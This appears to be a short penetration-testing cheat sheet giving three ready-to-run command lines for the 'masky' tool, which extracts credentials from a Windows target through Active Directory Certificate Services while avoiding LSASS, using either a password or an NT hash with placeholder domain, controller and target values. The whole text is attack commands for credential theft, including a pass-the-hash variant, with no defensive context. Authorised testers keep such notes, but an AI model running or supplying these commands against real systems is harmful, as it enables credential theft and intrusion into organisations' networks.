# masky — ADCS-based credential extraction (no LSASS touch)
masky -d $DOMAIN -u $USER -p $PASSWORD -dc-ip $DC_IP -ca $CA_NAME $TARGET_IP
masky -d $DOMAIN -u $USER -H $NTHASH -dc-ip $DC_IP -ca $CA_NAME $TARGET_IP
masky -d $DOMAIN -u $USER -p $PASSWORD -dc-ip $DC_IP -ca $CA_NAME -o output/ $TARGET_IP
